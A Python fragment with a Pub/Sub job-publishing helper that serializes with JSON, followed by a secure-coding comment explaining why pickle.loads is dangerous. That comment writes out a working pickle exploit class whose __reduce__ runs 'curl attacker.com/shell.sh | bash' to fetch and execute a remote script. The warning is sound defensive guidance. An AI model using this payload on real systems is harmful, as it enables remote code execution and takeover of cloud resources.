def publish_batch_job(project_id, topic_id, job_type, job_id, payload, priority='normal'):
    """
    Helper function to publish a batch job to Pub/Sub safely using JSON.
    
    Usage:
        publish_batch_job(
            project_id='my-project',
            topic_id='batch-jobs',
            job_type='data_transform',
            job_id='job-12345',
            payload={'records': [{'id': 1, 'value': 'abc'}], 'transform_type': 'normalize'}
        )
    """
    from google.cloud import pubsub_v1

    publisher = pubsub_v1.PublisherClient()
    topic_path = publisher.topic_path(project_id, topic_id)

    # SAFE serialization using JSON
    message_data = json.dumps({
        'job_id': job_id,
        'job_type': job_type,
        'payload': payload,
        'timestamp': datetime.utcnow().isoformat(),
    }).encode('utf-8')

    future = publisher.publish(
        topic_path,
        data=message_data,
        priority=priority,
        retry_count='0',
    )

    message_id = future.result()
    logger.info(f"Published job {job_id} with message ID {message_id}")
    return message_id


# ============================================================
# WARNING: Why pickle.loads() must NEVER be used here
# ============================================================
#
# An attacker could publish a message like this to your Pub/Sub topic:
#
#   import pickle, os
#   class Exploit:
#       def __reduce__(self):
#           return (os.system, ('curl attacker.com/shell.sh | bash',))
#   malicious_data = pickle.dumps(Exploit())
#   publisher.publish(topic, data=malicious_data)
#
# If your function calls pickle.loads(event['data']), the attacker's
# command executes with your Cloud Function's service account permissions,
# potentially accessing your entire GCP project's resources.
#
# JSON is safe because it only supports primitive data types
# (strings, numbers, booleans, lists, dicts, null) and cannot
# execute code during deserialization.
